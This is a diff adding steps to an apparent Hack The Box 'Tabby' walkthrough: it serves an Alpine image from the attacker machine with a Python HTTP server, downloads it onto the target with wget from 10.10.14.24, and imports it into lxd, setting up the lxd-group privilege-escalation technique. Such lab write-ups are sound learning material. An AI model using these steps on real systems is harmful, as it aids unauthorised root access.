@@ -236,3 +236,29 @@ Download and build the `Alpine` image locally.
 ▶ ./build-alpine
 ```
 
+#### Upload Alpine
+Start a local python server.
+```CSS
+▶ python -m http.server
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e673ea5a-fce2-4eee-9e61-ee168ced901e)
+
+```CSS
+▶ wget http://10.10.14.24:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/38061230-630a-458b-895e-54ca44c41868)
+
+Initiate `lxd`, input no to all prompts.
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5baadf28-e25c-4220-8dbd-a0511ed4a9d2)
+
+Import the Alpine Image
+```CSS
+ash@tabby:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f0d6c555-f546-48c8-85bd-e40c410c57eb)
+
+Check Import
+```CSS
+ash@tabby:~$ lxc image list
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d2db9947-159b-4a4e-b24c-d7a272029b6c)
